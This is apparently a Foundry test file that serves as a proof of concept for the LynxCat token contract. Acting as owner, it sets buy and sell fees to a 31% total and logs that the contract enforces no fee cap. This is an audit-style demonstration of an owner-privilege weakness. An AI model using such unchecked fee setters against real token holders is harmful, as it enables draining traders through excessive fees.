// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/LynxCat.sol";

contract MockWETH {}

contract MockPair {
    function name() public pure returns (string memory) {
        return "MockPair";
    }
    function symbol() public pure returns (string memory) {
        return "MP";
    }
    function decimals() public pure returns (uint8) {
        return 18;
    }
}

contract MockFactory {
    mapping(address => mapping(address => address)) public pairs;
    
    function createPair(address tokenA, address tokenB) external returns (address pair) {
        pair = address(new MockPair());
        pairs[tokenA][tokenB] = pair;
        pairs[tokenB][tokenA] = pair;
    }
}

contract MockRouter {
    address public immutable factory;
    address public immutable WETH;

    constructor(address _factory, address _WETH) {
        factory = _factory;
        WETH = _WETH;
    }
}

contract LynxCatFeeManipulationTest is Test {
    LynxCat token;
    address owner = address(0x1);
    MockRouter mockRouter;

    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy mock contracts
        MockWETH mockWETH = new MockWETH();
        MockFactory mockFactory = new MockFactory();
        mockRouter = new MockRouter(address(mockFactory), address(mockWETH));
        
        // Overwrite hardcoded router address
        address PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        vm.etch(PANCAKE_ROUTER, address(mockRouter).code);
        
        token = new LynxCat();
        vm.stopPrank();
    }

    function test_fee_manipulation() public {
        vm.startPrank(owner);

        // State snapshot BEFORE vulnerability trigger
        (uint256 taxBuyBefore, uint256 liquidityBuyBefore, uint256 marketingBuyBefore, uint256 devBuyBefore, uint256 burnBuyBefore) = token.buyFee();
        uint256 totalBuyBefore = taxBuyBefore + liquidityBuyBefore + marketingBuyBefore + devBuyBefore + burnBuyBefore;
        (uint256 taxSellBefore, uint256 liquiditySellBefore, uint256 marketingSellBefore, uint256 devSellBefore, uint256 burnSellBefore) = token.sellFee();
        uint256 totalSellBefore = taxSellBefore + liquiditySellBefore + marketingSellBefore + devSellBefore + burnSellBefore;

        console.log("--- BEFORE Trigger Fee Settings ---");
        console.log("Initial Buy Fees:");
        console.log("   tax: %d", taxBuyBefore);
        console.log("   liquidity: %d", liquidityBuyBefore);
        console.log("   marketing: %d", marketingBuyBefore);
        console.log("   dev: %d", devBuyBefore);
        console.log("   burn: %d", burnBuyBefore);
        console.log("   Total: %d", totalBuyBefore);
        console.log("Initial Sell Fees:");
        console.log("   tax: %d", taxSellBefore);
        console.log("   liquidity: %d", liquiditySellBefore);
        console.log("   marketing: %d", marketingSellBefore);
        console.log("   dev: %d", devSellBefore);
        console.log("   burn: %d", burnSellBefore);
        console.log("   Total: %d", totalSellBefore);

        // Vulnerability trigger - set excessive fees
        console.log("--- Triggering Attack: setBuyFee/setSellFee(10,10,5,5,1) ---");
        token.setBuyFee(10, 10, 5, 5, 1);
        token.setSellFee(10, 10, 5, 5, 1);

        // State snapshot AFTER vulnerability trigger
        (uint256 taxBuyAfter, uint256 liquidityBuyAfter, uint256 marketingBuyAfter, uint256 devBuyAfter, uint256 burnBuyAfter) = token.buyFee();
        uint256 totalBuyAfter = taxBuyAfter + liquidityBuyAfter + marketingBuyAfter + devBuyAfter + burnBuyAfter;
        (uint256 taxSellAfter, uint256 liquiditySellAfter, uint256 marketingSellAfter, uint256 devSellAfter, uint256 burnSellAfter) = token.sellFee();
        uint256 totalSellAfter = taxSellAfter + liquiditySellAfter + marketingSellAfter + devSellAfter + burnSellAfter;

        console.log("--- AFTER Trigger Fee Settings ---");
        console.log("Post-Attack Buy Fees:");
        console.log("   tax: %d", taxBuyAfter);
        console.log("   liquidity: %d", liquidityBuyAfter);
        console.log("   marketing: %d", marketingBuyAfter);
        console.log("   dev: %d", devBuyAfter);
        console.log("   burn: %d", burnBuyAfter);
        console.log("   Total: %d", totalBuyAfter);
        console.log("Post-Attack Sell Fees:");
        console.log("   tax: %d", taxSellAfter);
        console.log("   liquidity: %d", liquiditySellAfter);
        console.log("   marketing: %d", marketingSellAfter);
        console.log("   dev: %d", devSellAfter);
        console.log("   burn: %d", burnSellAfter);
        console.log("   Total: %d", totalSellAfter);

        // Vulnerability validation
        bool vulnerabilityExists = (totalBuyAfter == 31) && (totalSellAfter == 31);
        
        console.log("--- Validation Result ---");
        console.log("Buy Fee Total: %d (expected 31)", totalBuyAfter);
        console.log("Sell Fee Total: %d (expected 31)", totalSellAfter);
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Fee settings don't enforce maximum limits");
        } else {
            console.log("Vulnerability not Exist: Contract enforces fee limits properly");
        }
    }
}